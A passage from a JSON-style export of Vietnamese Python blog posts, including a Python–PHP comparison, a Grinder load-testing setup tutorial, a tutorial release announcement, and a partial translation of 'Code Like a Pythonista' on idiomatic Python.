Test (): pass # Các lập trình viên python thường dùng cách này để test module if __name__ == \"__main__\" : Test ()","tags":"Bài viết","title":"Cấu trúc đơn giản của một chương trình Python"},{"url":"2009/01/python-va-php.html","text":"Bài viết này được tổng hợp từ nhiều nguồn khác nhau (bằng tiếng anh) cộng với kinh nghiệm viết PHP và Python của tôi. I. Giống nhau Là ngôn ngữ cao cấp, thông dịch và định kiểu động Mã nguồn mở Cộng đồng lập trình viên rộng lớn Dễ học (so với Java, C hay Perl) Dễ mở rộng (so với Java, C++) Rất khả chuyển, chạy được trên nhiều nền tảng mà không phải biên dịch lại (tất nhiên rồi) hay sửa code II. Khác nhau 1. PHP hơn PHP kế thừa các curly braces để đánh dấu code block của C và dấu $ của Perl Các câu lệnh switch và vòng lặp do/while Toán tử gán, increment và decrement ( ++ và -- ) Toán tử ternary operator/statement ( … ? … : … ) * Trong Python 2.5 có câu lệnh if/else có tác dụng tương tự ( X if C else Y ) Array rất mạnh, dùng cho cả list và dict Tham chiếu ( $a =& $b tức là khi biến $b thay đổi, thì biến $a cũng thay đổi) Có cả private, protected và public access modifiers cho cả phương thức và thuộc tính Dùng cả abstract và final modifiers cho cả classes và methods Có interfaces $this là đối tượng mặc định, và không cần truyền ngược self để định nghĩa method như Python (với Python, để định nghĩa test là method của một lớp cần định nghĩa: def test(self) ) 2. Python hơn Ngôn ngữ sử dụng với các mục đích chung (Python có thể dùng để lập trình hầu hết mọi thứ, trong khi PHP chỉ dùng để lập trình web hay console. Tất nhiên có thể làm được việc khác nhưng không đáng kể) Sử dụng indentation (thụt vào đầu dòng, và dòng mới) thay thế cho các dấu curly braces để đánh dấu các code block. Tất nhiên là trông đẹp hơn, nhưng không thân thiện với HTML template cho Web) Có namespaces và modules (PHP 5.3 mới có namespaces) Truyền biến cho hàm hiệu quả hơn PHP nhờ cặp key=value pair, hỗ trợ tốt hơn cho giá trị mặc định của biến truyền vào hàm Cho phép đa thừa kế (không rõ là hay hay là dở nữa) Introspection tốt hơn PHP Reflection Mọi thứ từ biến tới đối tượng đều có kiểu tham chiếu Có Threading Document tốt hơn PHP (nhưng chắc chắn là ít tài liệu trên mạng hơn PHP) Có thể lập trình GUI (Tất nhiên là PHP cũng có thể nhưng không thể bằng) Có thể chạy trên .Net với IronPython hay nền Java với Jython (PHP cũng có thể chạy trên Java thậm chí trong cả các Application Server) Có web server, application server riêng, 100% viết bằng Python. Có lambda và các hàm hỗ trợ để xây dựng hàm (PHP có create_function và closure) Cached byte-code (PHP cũng có nhưng không tốt bằng) Unicode được hỗ trợ tốt hơn Kiểm soát lỗi ngoại lệ tốt hơn Chạy nhanh hơn PHP (nhanh hơn nhưng tốn CPU và RAM) Hãy học Python cho đời còn lại của bạn nhé! (Bài viết được chuyển từ diễn đàn do bạn kaka đóng góp)","tags":"Bài viết","title":"Python và PHP"},{"url":"2007/11/grinder-java-load-testing-framework.html","text":"Những người làm phần mềm hẳn ai cũng đã biết đến công đoạn rất quan trọng sau khi thành phẩm là \"kiểm thử\" (test). Một trong những kiểu kiểm thử (test case) cần phải làm là kiểm thử khả năng chịu đựng của hệ thống (load test). Có một công cụ rất mạnh để tự động hóa quá trình này, tiết kiệm thời gian và công sức cho đội kiểm thử đó là Grinder. Giới thiệu Tại sao lại là Grinder mà không phải là một công cụ nào khác? Đơn giản là vì Grinder sử dụng Jython - Python chạy trên nền Java - một sự kết hợp tuyệt vời của một ngôn ngữ rất mềm dẻo, mạnh mẽ (Python) với một khung nền có thể chạy trên mọi hệ điều hành (Java). Grinder bao gồm 3 thành phần: Console: đây là thành phần đóng vai trò điều khiển và tiếp nhận kết quả kiểm thử trả về. Agent process: đây là thành phần nhận lệnh từ Console và điều khiển các worker process. Worker process: đây là các kịch bản kiểm thử do người dùng định nghĩa. Như vậy, tại máy dùng để theo dõi và hiển thị kết quả kiểm thử, chạy Console. Tại các máy trạm chịu trách nhiệm chạy các kịch bản kiểm thử, chạy Agent process. Các kịch bản kiểm thử sẽ được tự động chuyển về cho các Agent process từ Console khi người dùng ra lệnh chạy. Chuẩn bị Để chạy được Grinder cần phải cài đặt các biến môi trường trỏ về đúng thư mục cài đặt Grinder và các thành phần liên quan. Đối với Windows Tạo tập tin kịch bản gọi mõi khi chạy setGrinderEnv.cmd : set GRINDERPATH = (full path to grinder install directory) set GRINDERPROPERTIES = (full path to grinder.properties)\\grinder.properties set CLASSPATH = %GRINDERPATH% \\lib\\grinder.jar; %CLASSPATH% set JAVA_HOME = (full path to java install directory) PATH = %JAVA_HOME% \\bin; %PATH% Hoặc gán trực tiếp biến môi trường mỗi khi khởi động bằng cách: Vào System Properties chọn tab Advanced chọn tiếp Environment Variables Chọn New và thêm vào tên biến và đường dẫn như trên. Đối với Unix Tạo tập tin kịch bản setGrinderEnv.sh : #!/usr/bin/ksh GRINDERPATH =( full path to grinder install directory ) GRINDERPROPERTIES =( full path to grinder.properties ) /grinder.properties CLASSPATH = $GRINDERPATH /lib/grinder.jar: $CLASSPATH JAVA_HOME =( full path to java install directory ) PATH = $JAVA_HOME /bin: $PATH export CLASSPATH PATH GRINDERPROPERTIES Hoặc gán trực tiếp mỗi khi đăng nhập vào người dùng bằng cách thêm vào trong tập tin /home/$USER/.bashrc : export GRINDERPATH =( full path to grinder install directory ) export GRINDERPROPERTIES =( full path to grinder.properties ) /grinder.properties export CLASSPATH = $GRINDERPATH /lib/grinder.jar: $CLASSPATH export JAVA_HOME =( full path to java install directory ) Cấu hình Tập tin thuộc tính grinder.properties thường gồm các tham số sau: Tên tham số Giải thích Giá trị mặc định grinder.processes Số lượng tiến trình worker mà một agent khởi tạo 1 grinder.threads Số lượng tiểu trình mà mỗi tiến trình worker sinh ra 1 grinder.runs Số lần chạy kịch bản kiểm thử mà mỗi tiểu trình chạy. 0 nghĩa là chạy lặp đi lặp lại. Tham số này nên để là 0 khi sử dụng Console để điều khiển hoạt động của các agent. 1 grinder.processIncrement Nếu đặt, agent sẽ tăng số lượng tiếng trình worker lên sau mỗi nhịp grinder.processIncrementInterval . 0 (Khởi động tất cả các tiến trình worker cùng lúc.) grinder.processIncrementInterval Sử dụng cùng với tham số grinder.processIncrement , tham số này xác định nhịp tăng tiến trình worker tính theo mili giây. 60000 grinder.initialProcesses Sử dụng cùng với tham số grinder.processIncrement , tham số này xác định số lượng tiến trình worker khởi động. Giá trị của grinder.processIncrement . grinder.duration Thời gian mỗi tiến trình worker chạy. Tham số này có thể xác định cùng với tham số grinder.runs , điều đó có nghĩa là tiến trình worker sẽ chấm dứt nếu hết thời gian chạy hoặc số lượng tiến trình worker đạt tối đa. 0 (Không kết thúc.) grinder.script Tên tập tin kịch bản sẽ chạy. grinder.py grinder.jvm Sử dụng máo ảo Java (JVM) khác. Mặc định là java nên không cần phải khai báo nếu đã có sẵn trong đường dẫn (PATH). java grinder.jvm.classpath Dùng để xác định đường dẫn đến các lớp sử dụng cho tiến trình worker. Bất cứ đường dẫn nào xác định ở đây sẽ được thêm vào trong đường dẫn classpath sử dụng để khởi động tiến trình Grinder. grinder.jvm.arguments Các tham số phụ thêm cho tiến trình worker. grinder.logDirectory Thư mục lưu tập tin log. Tự động tạo nếu chưa có. Thư mục cục bộ grinder.numberOfOldLogs Số lượng nhật kí được lưu lại từ lần chạy trước đó. 1 grinder.hostID Thay thế chuỗi host sử dụng trong tên tập tin nhật kí và trong nhật kí. Tên máy grinder.consoleHost Địa chỉ IP hoặc tên máy sử dụng cho kết nối giữa các agent, tiến trình worker và console. Tất cả các giao tiếp mạng của máy. grinder.consolePort Cổng để agent và tiến trình worker sử dụng để kết nối đến console. 6372 grinder.useConsole Nếu đặt là false , agent và tiến trình worker sẽ không sử dụng console. true grinder.reportToConsole.interval Khoảng thời gian mỗi tiến trình gửi cập nhật về cho console. Tham số này cũng xác định khoảng thời gian các tập tin dữ liệu được làm mới. Giá trị tính theo mili giây. 500 grinder.initialSleepTime Khoảng thời gian tối đa mỗi tiểu trình đợi trước khi bắt đầu. Không giống như thời gian ngừng trong kịch bản, tham số này thay đổi ngẫu nhiên giữa 0 và giá trị được đặt. Bị ảnh hưởng bởi tham số grinder.sleepTimeFactor , còn tham số grinder.sleepTimeVariation thì không. Giá trị tính theo mili giây. 0 grinder.sleepTimeFactor Thêm một hệ số vào thời gian chờ đã đặt, thông qua một thuộc tính hay trong kịch bản. Đặt giá trị này là 0.1 kịch bản sẽ chạy nhanh hơn mười lần. 1 grinder.sleepTimeVariation Thông thường, Grinder thay đổi thời gian chờ xác định trong kịch bản tùy theo sự phân chia bình thường. Tham số này xác định một dải phân đoạn mà đa số (chiếm 99.75%) là sẽ rơi vào trong dải này. Ví dụ, nếu thời gian chờ xác định là 1000 và sleepTimeVariation đặt là 0.1, khi đó 99.75% các giá trị thời gian chờ sẽ nằm trong khoảng 900 và 1100 milli giây. 0.2 grinder.logProcessStreams Đặt là false để tắt tính năng ghi nhật kí những thông báo và lỗi hiển thị của tiến trình worker. Dùng tham số này để giảm tải cho các tiểu trình tại máy trạm. true grinder.reportTimesToConsole Đặt là false để tắt tính năng phản hồi thông tin thời gian về cho console, các thông tin thống kê khác vẫn được phản hồi. true grinder.debug.singleprocess Nếu đặt là true , agent sẽ phát sinh tiểu trình để chạy kịch bản thay vì tiến trình, sử dụng một bộ nạp lớp đặc biệt để cô lập engine ra. Điều này cho phép engine dễ gỡ rối hơn. Mục đích chính của công cụ này là gỡ rối Grinder engine, tuy nhiên nó cũng có thể dùng cho người dùng chuyên nghiệp vào các mục đích khác. false grinder.useNanoTime Nết đặt là true , System.nanoTime() sẽ được dùng để đo thời gian thay vì System.currentTimeMills() . Grinder sẽ vẫn phản hồi thời gian tính bằng mili giây. Độ chính xác của những phương pháp này phụ thuộc vào sự hiện thực hóa JVM và hệ điều hành. Tham số true chỉ dùng cho J2SE 5 hoặc lớn hơn. false Ví dụ Thông thường, một tập tin cấu hình đơn giản chỉ cần các thông số sau: grinder.process 1 grinder.threads 1 grinder.runs 1 grinder.script sample.py Nếu chạy ở chế độ có Console thì cần thêm: grinder.useConsole true grinder.consoleHost x.x.x.x (IP hoặc tên máy Console) grinder.consolePort xxx (cổng quy định bởi Console) Chạy Để chạy Grinder có thể đơn giản như sau: Chạy Console: java net.grinder.Console Chạy Agent: java net.grinder.Grinder Hoặc tạo tập tin kịch bản như sau: Đối với Windows startAgent.cmd call ( path to setGrinderEnv.cmd ) \\setGrinderEnv.cmd echo %CLASSPATH% java -cp %CLASSPATH% net.grinder.Grinder %GRINDERPROPERTIES% startConsole.cmd call ( path to setGrinderEnv.cmd ) \\setGrinderEnv.cmd java -cp %CLASSPATH% net.grinder.Console Đối với Unix startAgent.sh #!/usr/bin/ksh . ( path to setGrinderEnv.sh ) /setGrinderEnv.sh java -cp $CLASSPATH net.grinder.Grinder $GRINDERPROPERTIES startConsole.sh #!/usr/bin/ksh . ( path to setGrinderEnv.sh ) /setGrinderEnv.sh java -cp $CLASSPATH net.grinder.Console Công việc tiếp theo chỉ là... viết kịch bản kiểm thử và chạy. Tự động hóa Đến đây hẳn nhiều người, nhất là những lập trình viên không (chưa) biết ngôn ngữ Python sẽ tiếc nuối vì không biết viết mã cho kịch bản kiểm thử như thế nào. Nhưng có một cách để những lập trình viên này vẫn có thể dùng công cụ kiểm thử mạnh mẽ Grinder mà không cần phải biết viết một dòng mã Python nào. Từ phiên bản 3.0 trở lên, Grinder cung cấp một môi trường proxy kiểm soát dữ liệu vào ra để tự động tạo mã kịch bản tương ứng. Điều đó có nghĩa là, kịch bản sẽ tự động được tạo ra theo đúng những thao tác chuột và bàn phím mà những người kiểm thử làm. Và tất nhiên cách này chỉ dùng cho những kiểm thử đối với các ứng dụng web. Để khởi động Grinder proxy: Đối với Windows startProxy.cmd call ( path to setGrinderEnv.cmd ) \\setGrinderEnv.cmd java -cp %CLASSPATH% net.grinder.TCPProxy -console -http > script_name.py Đối với Unix startProxy.sh #!/usr/bin/ksh . ( path to setGrinderEnv.sh ) /setGrinderEnv.sh java -cp $CLASSPATH net.grinder.TCPProxy -console -http > script_name.py Sau đó thiết đặt trình duyệt cho trỏ đến proxy là localhost với cổng 8081 và bắt đầu các thao tác kiểm thử. Tổng kết Trên đây là những bước cơ bản nhất để có thể làm quen với một công cụ kiểm thử vô cùng mạnh mẽ, đơn giản, dễ dùng và đặc biệt là hoàn toàn miễn phí. Mặc dù chạy trên nền Java nhưng trong quá trình thử nghiệm cũng như sử dụng để kiểm thử hệ thống Online Trading của công ty Chứng khoán VNDirect, Grinder chạy rất nhẹ nhàng, không tốn nhiều RAM như tôi lo ngại, thậm chí tôi sử dụng chính các máy của người dùng làm agent trong khi mọi người vẫn làm việc mà không hề thấy hệ thống bị kéo chậm lại hay có vấn đề gì xảy ra. Việc làm quen với Grinder cũng không mất quá nhiều thời gian, kể cả với một tay ngang như tôi. Grinder thật sự rất ấn tượng. Và điểm nổi trội nhất của Grinder đó là nó cho phép người dùng tự định nghĩa kịch bản kiểm thử bằng một ngôn ngữ mạnh mẽ và mềm dẻo - Python.","tags":"Bài viết","title":"Grinder - Java load testing framework"},{"url":"2007/09/phat-hanh-bai-chi-dan-python-25.html","text":"Bài chỉ dẫn Python 2.5 tiếng Việt đã được nhóm Python cho người Việt phát hành vào ngày 26 tháng 09 năm 2007. Ngày 26 tháng 09 năm 2007, theo đúng như dự định, nhóm Python cho người Việt đã chính thức phát hành bản dịch của tài liệu Python Tutorial với tên Bài chỉ dẫn Python . Tài liệu này giới thiệu người đọc những khái niệm nhập môn cơ bản của ngôn ngữ Python và các thư viện có sẵn của nó. Người mới học, cũng như các chuyên gia trong ngành Công Nghệ Thông Tin có thể tìm được nhiều thông tin bổ ích từ tài liệu. Phát biểu về sự kiện này, anh Nguyễn Thành Nam (một trong các dịch giả và là thành viên của nhóm Python cho người Việt) nhận xét: Việc có mặt một tài liệu Python tiếng Việt hoàn toàn miễn phí là một dấu mốc quan trọng trong việc đưa ngôn ngữ Python đến gần hơn với người dùng Việt Nam. Anh cũng cho biết thêm rằng bản dịch này là sự hợp tác của nhiều dịch giả từ khắp nơi trên thế giới có cùng niềm đam mê với ngôn ngữ Python và mong muốn giới thiệu và phát triển nó rộng rãi ở Việt Nam. Tài liệu có thể được truy cập tại địa chỉ http://www.vithon.org/tutorial/2.5/tut.html .","tags":"Tin tức","title":"Phát hành Bài chỉ dẫn Python 2.5"},{"url":"2007/08/python-s60-cho-nguoi-moi-bat-dau.html","text":"Xin chào các bạn, mình là thành viên mới của forum. Mình thực sự rất yêu thích Python, và cũng mới bắt đầu nghiên cứu về Python trong thời gian gần đây. Đặc biệt mình có nghiên cứu thêm về phát triển ứng dụng Python cho điện thoại Nokia S60. Trong quá trình học mình có ghi chép lại những gì đã học thành tài liệu Python S60 cho người mới bắt đầu. Tài liệu này mình vẫn viết, được cập nhật hàng ngày và có thể xem cũng như download tại http://my.opera.com/noname00/forums/topic.dml?id=198943 (Khuyến cáo nên down bản PDF, vì nếu có thay đổi thì bản PDF sẽ được thay đổi chứ mình không thay đổi trên forum :D) Mình nghĩ nó thích hợp cho cả những người mới bắt đầu làm quen với Python (như mình) cũng như những người thích lập trình Python cho điện thoại di động. Mong các bạn cho ý kiến","tags":"Bài viết","title":"Python S60 cho người mới bắt đầu"},{"url":"2007/07/lap-trinh-nhu-mot-pythonista-thanh-ngu-python.html","text":"Bản lược dịch của bài nói chuyện \"Code Like a Pythonista: Idiomatic Python\" do David Goodger trình bày tại PyCon 2007 và OSCON 2007. Ngày 26 tháng 07 năm 2007, David Goodger gửi bài nói chuyện Code Like a Pythonista: Idiomatic Python mà ông đã trình bày ở PyCon 2007 và OSCON 2007 lên trang nhà. Đây là bài lược dịch những ý chính. Trước khi vào bài, xin được giới thiệu qua về hai từ mà chúng ta hay gặp là pythonista và pythoneer . Pythonista chỉ một người theo đuổi ngôn ngữ Python cuồng nhiệt, như là một cổ động viên bóng đá trung thành. Pythoneer chỉ một người luôn đi đầu và nắm bắt những điểm mới của ngôn ngữ Python, như là nhà khoa học tiên phong trong lĩnh vực của họ. Thông thường, hai từ này đều dùng để chỉ một người rất yêu thích Python, và có thể được hoán chuyển. Kiểu lập trình: Dễ đọc là quan trọng Programs must be written for people to read, and only incidentally for machines to execute. —Abelson & Sussman, Structure and Interpretation of Computer Programs Tạm dịch: Chương trình phải được viết ra để cho người đọc, và chỉ là sự trùng hợp để cho máy thực thi. Khoảng trắng Bốn (4) khoảng trắng ở mỗi nấc thụt vào Không dùng tab Không bao giờ lẫn lộn tab và khoảng trắng Cách một dòng giữa các hàm Cách hai dòng giữa các lớp Chừa một khoảng trắng sau dấu phẩy , trong từ điển, danh sách, bộ, danh sách tham số, và sau dấu hai chấm : trong từ điển nhưng không phải trước nó Chừa một khoảng trắng trước và sau phép gán và so sánh (trừ khi trong danh sách tham số) Không chừa khoảng trắng trong ngoặc tròn, hoặc ngay trước các danh sách tham số Không chừa khoảng trắng trong các chuỗi tài liệu Cách đặt tên joined_lower cho hàm, phương thức và thuộc tính joined_lower hoặc ALL_CAPS cho hằng CapWords cho lớp camelCase chỉ dùng để hợp với những thói quen đã có Với các thuộc tính: public , _internal , và __private nhưng hạn chế dùng kiểu __private Những câu lệnh ghép Tốt: if foo == 'blah' : do_something () do_one () do_two () do_three () Xấu: if foo == 'blah' : do_something () do_one (); do_two (); do_three () Việc thiếu thụt vào ở mã \"Xấu\" che mất câu lệnh if . Sử dụng nhiều câu lệnh trên cùng một dòng là mang tội lớn. Hoán đổi giá trị Trong các ngôn ngữ khác: temp = a ; a = b ; b = temp ; Trong Python: b , a = a , b Dấu _ tương tác Đây là một chức năng thật sự hữu dụng mà ít người biết. Trong môi trường thông dịch tương tác, khi bạn định giá một biểu thức hoặc gọi một hàm, kết quả sẽ được gán vào một tên tạm, _ (dấu gạch chân). >>> 1 + 1 2 >>> _ 2 _ chứa biểu thức được in cuối cùng. Khi kết quả là None , không có gì được in ra nên _ không thay đổi. Dấu gạch chân chỉ có tác dụng trong môi trường tương tác, không có tác dụng trong một mô-đun. Tạo chuỗi từ các chuỗi con Dùng: colors = [ 'red' , 'blue' , 'green' , 'yellow' ] result = '' . join ( colors ) Không dùng: colors = [ 'red' , 'blue' , 'green' , 'yellow' ] result = '' for s in colors : result += s Trường hợp hay gặp khi danh sách có nhiều hơn một phần từ: colors = [ 'red' , 'blue' , 'green' , 'yellow' ] print 'Choose' , ', ' . join ( colors [: - 1 ]), 'or' , colors [ - 1 ] In ra: Choose red, blue, green or yellow Dùng in khi có thể Tốt: for key in d : print key in thường là nhanh hơn có thể dùng được với danh sách, bộ, từ điển, và tập hợp Xấu: for key in d . keys (): print key Chỉ dùng được cho các đối tượng có phương thức keys() . Nhưng sẽ cần dùng keys() khi sửa đổi từ điển: for key in d . keys (): d [ str ( key )] = d [ key ] vì keys() tạo ra một danh sách các khóa riêng để lặp. Nếu không, bạn sẽ gặp phải lỗi RuntimeError vì từ điển bị thay đổi trong khi lặp. Để thống nhất, hãy dùng key in dict thay vì dict.has_key(key) . Phương thức get() của từ điển Chúng ta thường khởi tạo các phần tử từ điển trước khi dùng. Đây là cách không hay: navs = {} for ( portfolio , equity , position ) in data : if portfolio not in navs : navs [ portfolio ] = 0 navs [ portfolio ] += position * prices [ equity ] Dùng dict.get(key, default) sẽ tránh được việc kiểm tra: navs = {} for ( portfolio , equity , position ) in data : navs [ portfolio ] = navs . get ( portfolio , 0 ) + position * prices [ equity ] Phương thức setdefault() của từ điển Cách dở để khởi tạo một từ điển: equities = {} for ( portfolio , equity ) in data : if portfolio in equities : equities [ portfolio ] . append ( equity ) else : equities [ portfolio ] = [ equity ] Dùng dict.setdefault(key, default) nhanh gọn hơn nhiều: equities = {} for ( portfolio , equity ) in data : equities . setdefault ( portfolio , []) . append ( equity ) dict.setdefault() tương đương với lấy, hoặc thiết lập rồi lấy . Nó rất hiệu quả nếu khóa từ điển cần nhiều thời gian để tính, hoặc vì nó dài nên khó nhập. Tuy nhiên giá trị default luôn luôn được tính cho dù có cần dùng hay không. Phương thức setdefault() cũng có thể được dùng riêng vì hiệu quả phụ của nó: navs = {} for ( portfolio , equity , position ) in data : navs . setdefault ( portfolio , 0 ) navs [ portfolio ] += position * prices [ equity ] defaultdict Trong Python 2.5, defaultdict là một phần của mô-đun collections . Nó giống như từ điển thường nhưng với hai đặc điểm khác: Nó nhận một tham số là một hàm nhà máy mặc định (default factory functions) và Khi khóa không thể tìm thấy trong từ điển, hàm này sẽ được gọi và kết quả trả về sẽ được dùng để khởi tạo khóa đó Đây là ví dụ trước, mà mỗi phần tử trong từ điển là một danh sách rỗng, nhưng dùng defaultdict : from collections import defaultdict equities = defaultdict ( list ) for ( portfolio , equity ) in data : equities [ portfolio ] . append ( equity ) Trong ví dụ này, hàm nhà máy mặc định là list . Để tạo từ điển giá trị mặc định là 0 thì dùng int : navs = defaultdict ( int ) for ( portfolio , equity , position ) in data : navs [ portfolio ] += position * prices [ equity ] Vì khóa mới luôn được tạo nên bạn sẽ không gặp KeyError với defaultdict . Bạn phải dùng in để kiểm tra xem một khóa đã có trong từ điển hay chưa. Kiểm tra giá trị đúng # dùng: # không dùng: if x : if x == True : pass pass Nếu là một danh sách: # dùng: # không dùng: if items : if len ( items ) != 0 : pass pass # and definitely not this: if items != []: pass Để điều khiển giá trị đúng của các trường hợp của một lớp người dùng định nghĩa, sử dụng các phương thức đặc biệt __nonzero__ hoặc __len__ . Dùng __len__ nếu lớp đó là một lớp chứa (container) có chiều dài: class MyContainer ( object ): def __init__ ( self , data ): self . data = data def __len__ ( self ): \"\"\"Return my length.\"\"\" return len ( self . data ) Nếu lớp đó không phải là một lớp chứa thì dùng __nonzero__ : class MyClass ( object ): def __init__ ( self , value ): self . value = value def __nonzero__ ( self ): \"\"\"Return my truth value (True or False).\"\"\" # This could be arbitrarily complex: return bool ( self . value ) Trong Python 3.0, __nonzero__ được đổi tên thành __bool__ để đồng nhất với kiểu bool có sẵn. Thêm dòng sau vào lớp của bạn cho nó tương hợp hơn: __bool__ = __nonzero__ Chỉ mục và phần tử Dùng enumerate() để lặp: for ( index , item ) in enumerate ( items ): print index , item # thay vì: # thay vì: index = 0 for i in range ( len ( items )): for item in items : print i , items [ i ] print index , item index += 1 enumerate() trả về một bộ lặp (iterator) (một bộ sinh, generator, là một kiểu bộ lặp): >>> enumerate ( items ) <enumerate object at 0xb73ee0f4> >>> e = enumerate ( items ) >>> e . next () (0, 'zero') >>> e . next () (1, 'one') >>> e . next () (2, 'two') >>> e . next () (3, 'three') >>> e . next () Traceback (most recent call last): File \"\", line 1, in ? StopIteration Các ngôn ngữ khác có biến Trong các ngôn ngữ khác, gán vào một biến là đưa giá trị vào một hộp. int a = 1; Hộp a bây giờ chứa một số nguyên 1. Gán một giá trị khác vào cùng biến đó sẽ thay thế những gì đã có trong hộp. a = 2; Gán một biến vào một biến khác sẽ tạo một bản sao của giá trị trong hộp này và đặt nó vào hộp mới. int b = a; b là một hộp mới, có giá trị là bản sao của số nguyên 2. Trong khi hộp a có một bản sao riêng. Python có tên Trong Python, tên hoặc định danh giống như thẻ tên gắn vào một đối tượng. a = 1 Ở đây, số nguyên 1 được gắn một thẻ tên a . Nếu chúng ta gán lại vào a , chúng ta chỉ chuyển thẻ a vào một đối tượng khác. a = 2 Giờ đây tên a được gắn vào số nguyên 2. Số nguyên 1 có thể vẫn còn tồn tại nhưng nó không còn thẻ tên a . Nếu chúng ta gán một tên vào một tên khác, chúng ta chỉ là gắn một thẻ tên khác vào đối tượng đã có. b = a Tên b chỉ là một thẻ tên thứ hai được gắn vào cùng một đối tượng như thẻ tên a . Trong Python, biến là những thẻ tên, không phải là những hộp được đánh tên. Gộp danh sách (list comprehension, hay listcomp) Thông thường: new_list = [] for item in a_list : if condition ( item ): new_list . append ( fn ( item )) Với listcomp: new_list = [ fn ( item ) for item in a_list if condition ( item )] Listcomp rõ ràng và xúc tích. Listcomp có thể chứa nhiều vòng for hoặc câu lệnh if nhưng nếu nhiều hơn 2 hay 3 thì tốt nhất là nên dùng cách thông thường. Ví dụ danh sách bình phương của các số lẻ từ 0 tới 9: >>> [ n ** 2 for n in range ( 10 ) if n % 2 ] [1, 9, 25, 49, 81] Biểu thức bộ sinh (generator expression, genexp) Để tính tổng bình phương từ 1 đến 100 ta có thể dùng vòng lặp for : total = 0 for num in range ( 1 , 101 ): total += num * num Hoặc dùng hàm sum() với listcomp: total = sum ([ num * num for num in range ( 1 , 101 )]) Hoặc sum() với genexp: total = sum ( num * num for num in xrange ( 1 , 101 )) Biểu thức bộ sinh giống như gộp danh sách nhưng nó lười (lazy). Listcomp tạo danh sách ngay lập tức, còn genexp tạo từng giá trị một. Khi chúng ta không cần một danh sách mà chỉ cần từng giá trị của danh sách đó, genext rất hữu dụng. Ví dụ như để tính tổng bình phương từ 1 tới 1000000000, chúng ta sẽ dùng hết bộ nhớ nếu ta dùng listcomp, nhưng với genexp thì chuyện này có thể được thực hiện (mặc dù hơi lâu): total = sum ( num * num for num in xrange ( 1 , 1000000000 )) Sắp xếp với DSU DSU là Decorate-Sort-Undecorate (trang hoàng, sắp xếp, khử trang hoàng). Thay vì tạo một hàm so sánh riêng, ta có thể tạo một danh sách tạm sẽ được sắp xếp. Ví dụ để sắp xếp một danh sách các chuỗi theo thứ tự chữ cái thường của chúng: a_list = \"Mot Hai Ba\" . split () # a_list = [\"Mot\", \"Hai\", \"Ba\"] # Decorate: to_sort = [( lower ( x ), x ) for x in a_list ] # to_sort = [(\"mot\", \"Mot\"), (\"hai\", \"Hai\"), (\"ba\", \"Ba\")] # Sort: to_sort . sort () # to_sort = [(\"ba\", \"Ba\"), (\"hai\", \"Hai\"), (\"mot\", \"Mot\")] # Undecorate: a_list = [ item [ - 1 ] for item in to_sort ] # a_list = [\"Ba\", \"Hai\", \"Mot\"] Đây là sự đổi chác giữa bộ nhớ và thời gian. Đơn giản và nhanh hơn, nhưng tốn bộ nhớ hơn vì chúng ta cần tạo một danh sách mới. Bộ sinh (generator) Chúng ta đã gặp biểu thức bộ sinh. Chúng ta cũng có thể tạo những bộ sinh phức tạp riêng như là những hàm: def my_range_generator ( stop ): value = 0 while value < stop : yield value value += 1 for i in my_range_generator ( 10 ): do_something ( i ) Từ khóa yield biến một hàm thành một bộ sinh. Khi bạn gọi một hàm bộ sinh (generator function), thay vì thực thi mã ngay lập tức, Python trả về một đối tượng bộ sinh (generator object), cũng là một bộ lặp vì nó có phương thức next() . Vòng for gọi phương thức next() của bộ lặp cho đến khi biệt lệ StopIteration được nâng. Bạn có thể tự nâng StopIteration hoặc nó sẽ được nâng khi đến cuối bộ sinh. Vòng for có một vế else sẽ được thực thi khi mà bộ lặp chạy xong, nhưng không được thực thi khi thoát khỏi bằng câu lệnh break . Ví dụ nếu chúng ta muốn kiểm tra xem điều kiện nào đó có thỏa với một phần tử bất kỳ của một dãy: for item in sequence : if condition ( item ): break else : raise Exception ( 'Condition not satisfied.' ) Ví dụ để lọc các dòng trắng khỏi bộ đọc CSV hoặc các phần tử của một danh sách: def filter_rows ( row_iterator ): for row in row_iterator : if row : yield row data_file = open ( path , 'rb' ) irows = filter_rows ( csv . reader ( data_file )) Hoặc đọc từng dòng từ tập tin văn bản: datafile = open ( 'datafile' ) for line in datafile : do_something ( line ) Điều này làm được là vì các đối tượng tập tin hỗ trợ phương thức next() y như các bộ lặp khác: danh sách, bộ, từ điển (cho các khóa của nó), và các bộ sinh. Một điều cần lưu ý là bạn không thể dùng lẫn lộn next() và read() ở các đối tượng tập tin trừ khi bạn dùng Python 2.5 trở lên. EAFP v.s. LBYL Easier to Ask Forgiveness than Permission: Dễ xin sự tha thứ hơn là sự cho phép. Ý là cứ làm đi và tìm sự tha thứ sau nếu làm sai, còn hơn là tìm sự cho phép trước khi làm. Look Before You Leap: Nhìn trước khi nhảy. Ý là phải xem xét hết các trường hợp có thể xảy ra trước khi làm. Thông thường EAFP được ưa chuộng hơn. Ví dụ như để ép kiểu một biến thành kiểu chuỗi, ta có thể gói đoạn mã trong một câu lệnh try thay vì dùng isinstance() . Và thông thường thì bạn sẽ nhận ra giải pháp tổng quát hơn là nếu bạn cố tìm ra mọi trường hợp có thể. try : return str ( x ) except TypeError : ... Luôn luôn chỉ rõ kiểu biệt lệ! Không bao giờ dùng vế except đơn giản vì nó sẽ chụp luôn cả những biệt lệ không lường trước, làm cho mã của bạn khó gỡ rối. Không dùng from module import * Thay vào đó, tham chiếu tới tên qua tên mô-đun: import module module . name Hoặc dùng tên mô-đun ngắn: import long_module_name as mod mod . name Hoặc tự nhập vào các tên bạn cần: from module import name name Mô-đun và kịch bản Để vừa tạo một mô-đun và một kịch bản chạy được: if __name__ == '__main__' : # script code here Trừ trường hợp rất cần thiết, bạn không nên đặt mã thực thi ở mức cao nhất mà hãy đặt chúng ở trong các hàm, các lớp, hoặc các phương thức rồi dùng nó trong if __name__ == '__main__' . Cấu trúc mô-đun Một mô-đun nên có cấu trúc như sau: \"\"\"module docstring\"\"\" # imports # constants # exception classes # interface functions # classes # internal functions & classes def main ( ... ): ... if __name__ == '__main__' : status = main () sys . exit ( status ) Gói package/ __init__.py # <-- Lưu ý module1.py subpackage/ __init__.py module2.py Dùng để quản lý dự án Giảm các mục trong đường dẫn nạp (load-path) Giảm xung đột tên Ví dụ: import package.module1 from packages.subpackage import module2 from packages.subpackage.module2 import name Trong Python 2.5 chúng ta có nhập tuyệt đối (absolute import) và nhập tương đối (relative import): from __future__ import absolute_import Đơn giản tốt hơn phức tạp Debugging is twice as hard as writing the code in the first place. Therefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it. —Brian W. Kernighan, cùng tác giả của The C Programming Language và là chữ K trong AWK Tạm dịch: Gỡ rối khó gấp hai lần viết mã. 